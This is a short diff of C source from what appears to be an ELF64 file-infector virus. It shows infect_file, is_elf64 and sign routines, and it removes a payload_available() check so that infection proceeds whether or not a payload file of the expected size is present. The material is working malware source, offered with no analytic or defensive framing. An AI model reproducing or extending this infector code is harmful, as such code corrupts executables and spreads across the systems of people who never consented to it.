@@ -39,17 +39,6 @@ static int  is_elf64(t_file file)
     return 1;
 }
 
-static int  payload_available(void)
-{
-    struct stat st;
-
-    if (lstat("payload.bin", &st) < 0)
-        return 0;
-    if (!S_ISREG(st.st_mode) || st.st_size != PAYLOAD_BIN_SIZE)
-        return 0;
-    return 1;
-}
-
 static void infect_file(const char *path)
 {
     struct stat st;
@@ -66,8 +55,6 @@ static void infect_file(const char *path)
         return;
     }
     file_unload(target);
-    if (!payload_available())
-        return;
     target = file_load(path, PAYLOAD_BIN_SIZE);
     if (is_elf64(target))
         sign(target);
